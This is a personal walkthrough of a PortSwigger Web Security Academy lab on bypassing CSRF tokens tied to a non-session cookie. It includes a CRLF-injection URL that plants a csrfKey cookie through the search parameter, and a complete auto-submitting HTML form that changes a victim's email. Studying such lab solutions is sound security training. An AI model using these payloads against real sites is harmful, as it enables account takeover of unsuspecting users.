https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie


This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya



1) login as wiener:peter and try to change the email
    we can see that it is used a couple of values to protect from csrf
    a cookie csrfKey=npPJ7IJxcJHYnaCOXygHUAguquolkkDj
    a csrf token csrf=RD7YXtrRawCI9MH4981DcvbPTjMRTC6U

    BUT 
    they are the same for each request, so they don't change

2) logout and login as carlos:montoya
    we can see that also here the couple is always:
    a cookie csrfKey=npPJ7IJxcJHYnaCOXygHUAguquolkkDj
    a csrf token csrf=RD7YXtrRawCI9MH4981DcvbPTjMRTC6U

3) so craft a malicious html code that performs a POST request to /change-email using the couple of values








To perform the email changing we need to have a valid csrfkey and a valid csrf token
we have seen that if we craft /?search=test%0d%0aSet-Cookie:%20csrfKey=KEY_TO_SET%3b%20SameSite=None we are able to set the csrf key in the browser cookies

So what we need is to force the victim to fetch this crafted search where we insert our wiener VALID csrfKey and at the same time to force him to use the csrf we can find in the valid wiener email change form
So what we can do is


BEFORE SENDING THE POST REQUEST WE NEED TO SET THE csrfkey IN THE VICTIM BROWSER SO WE CAN USE THIS APPROACH


<html>
    <body>
        <form action="https://*****LAB-ID****.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit2@evil-user.net" />
            
            <!--- here we are using a valid csrf (from wiener session --->
            <input type="hidden" name="csrf" value="RD7YXtrRawCI9MH4981DcvbPTjMRTC6U" />

        </form>



       <!--- here we are setting the wiener csrfkey in the victim browser --->
     <img src="https://*****LAB-ID****.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=npPJ7IJxcJHYnaCOXygHUAguquolkkDj%3b%20SameSite=None" onerror="document.forms[0].submit()">

    </body>
</html>


IT WORKS BECAUSE THE WEBSITE ALLOWS THE SETTING OF COOKIES USING /?search parameter
